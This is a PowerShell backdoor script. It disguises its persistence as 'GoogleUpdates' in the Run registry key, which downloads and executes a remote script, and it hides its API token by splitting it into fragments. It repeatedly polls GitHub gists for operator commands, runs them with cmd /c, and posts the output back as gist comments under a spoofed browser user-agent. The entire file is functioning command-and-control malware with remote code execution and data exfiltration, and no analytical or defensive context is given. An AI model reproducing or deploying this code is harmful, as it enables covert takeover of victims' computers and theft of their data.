$gistsUser="tedmillerday";
$t1="896a0";

$checkTime=60;
$t2="3d6b0974ef647ae94f63";
$t3="6263064648daeb0";
$gistsApiToken=$t1+$t2+$t3;

$name = "GoogleUpdates"
$value ="powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/maymiday/rop/master/gpupdate.ps1')"
try{
    New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $name -PropertyType String -Value $value -ErrorAction Stop
    $tip = "Success:"+$name;
}catch [System.Exception]{
        
}finally{

}

function sendResult($r){
    try{
	 Add-Type -AssemblyName System.Web;
     $encodeResult=[System.Web.HttpUtility]::UrlEncode([system.String]::Join("`r`n",$r))
     
     $webclient.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
     $r=$webclient.UploadString($cmdGist.comments_url,"{""body"":""$encodeResult""}")
     }catch{
	$encodeResult=[System.Web.HttpUtility]::UrlEncode([system.String]::Join("`r`n",$_))
	$webclient.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");
	$r=$webclient.UploadString($cmdGist.comments_url,"{""body"":""$encodeResult""}")
     }
    
}
function parseCommand($command){
     $jsonCommandStr="{"+$command+"}";
     try{
	#$jsonCommand=ConvertFrom-Json $jsonCommandStr;
	 [System.Reflection.Assembly]::LoadWithPartialName("System.Web.Extensions");
	$ser = New-Object System.Web.Script.Serialization.JavaScriptSerializer;
	$jsonCommand = $ser.DeserializeObject($jsonCommandStr);
    }catch{
	sendResult("ERROR: $_");
    }
     if($jsonCommand -and $jsonCommand.Command.length -gt 0){
	  $commandStr=$jsonCommand.Command;
	  if($commandStr){
	    $result = cmd /c ($commandStr+" 2>&1");
	    sendResult("Command Result for $commandStr :`r`n"+$result);
	  }
     }
     if($jsonCommand -and $jsonCommand.ReadFile.length -gt 0){
     }
     if($jsonCommand -and $jsonCommand.WriteFile.length	-gt 0){
     }
     if($jsonCommand -and $jsonCommand.Powershell.length -gt 0){
     }
}


$oldCommand="";
$webclient=new-object System.Net.WebClient
#$webclient.Credentials=new-object System.Net.NetworkCredential($gistsUser,$gistsApiToken)
$upass=[System.Text.Encoding]::UTF8.GetBytes("${gistsUser}:${gistsApiToken}");
$authHeader="Basic "+[System.Convert]::ToBase64String($upass);
$webclient.Headers.Add("Authorization",$authHeader);
$webclient.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET CLR 1.0.3705;)");

while(1){
  Start-Sleep -Seconds 60;

  $webclient.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET	CLR 1.0.3705;)");
  $gists=$webclient.DownloadString('https://api.github.com/gists')
	
  [System.Reflection.Assembly]::LoadWithPartialName("System.Web.Extensions");
  $ser = New-Object System.Web.Script.Serialization.JavaScriptSerializer;
  $jsonGists = $ser.DeserializeObject($gists);
 

  $cmdId=""
  $cmdGist={};
  foreach ($oneGist in $jsonGists){
	  if(($oneGist["files"].cmd ) -and ($oneGist["files"].cmd.filename -eq "cmd")){
	  $cmdId=$oneGist.id;
	  $cmdGist=$oneGist;
	  break;
	  }
  }

  $command="";
  if(($cmdId.length -gt	0) -and	($cmdGist.url.length -gt 0)){
  $webclient.Headers.Add("user-agent", "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; .NET	CLR 1.0.3705;)");
  $cmdGistContent=$webclient.DownloadString($cmdGist.url);
  #$cmdGistDetail=ConvertFrom-Json $webclient.DownloadString($cmdGist.url);

  [System.Reflection.Assembly]::LoadWithPartialName("System.Web.Extensions");
  $ser = New-Object System.Web.Script.Serialization.JavaScriptSerializer;
  $cmdGistDetail = $ser.DeserializeObject($cmdGistContent);
	

  $command=$cmdGistDetail["files"].cmd.content;
  }
  if($command -and ($command -ne $oldCommand)){
  $commandList=$command.split("`n");
  foreach ($oneCommand in $commandList){
      parseCommand($oneCommand);
  }

  $oldCommand=$command;
  }
}


